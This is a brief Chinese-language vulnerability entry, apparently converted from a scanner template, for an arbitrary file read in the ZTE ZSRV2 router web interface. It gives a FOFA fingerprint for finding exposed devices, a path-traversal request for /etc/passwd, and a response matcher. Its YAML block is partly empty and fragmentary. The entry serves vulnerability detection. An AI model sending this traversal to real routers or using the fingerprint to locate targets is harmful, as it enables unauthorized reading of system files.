# 中兴ZSRV2路由器文件读取漏洞

- **系统**：中兴ZSRV2路由器　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title = ZSRV2路由器Web管理系统`
- **请求**：`GET /css//../../../../../../../../etc/passwd HTTP/1.1`
- **关键头**：`id: zhongxing-zsrv2-route-fileread`　`name: zhongxing-zsrv2-route-fileread`　`author: BB`　`severity: high`　`description: 中兴 ZSRV2路由器 存在文件读取漏洞。`　`tags: zhongxing,fileread`　`fofa-qeury: title = ZSRV2路由器Web管理系统`

**请求体 / payload**
```
- raw:
-
Host:
matchers:
- type: dsl
name: fileread
dsl:
- "status_code == 200 && contains(body,'/bin/sh') && contains(header,'text/html')"
```
- **预期**：200　|　—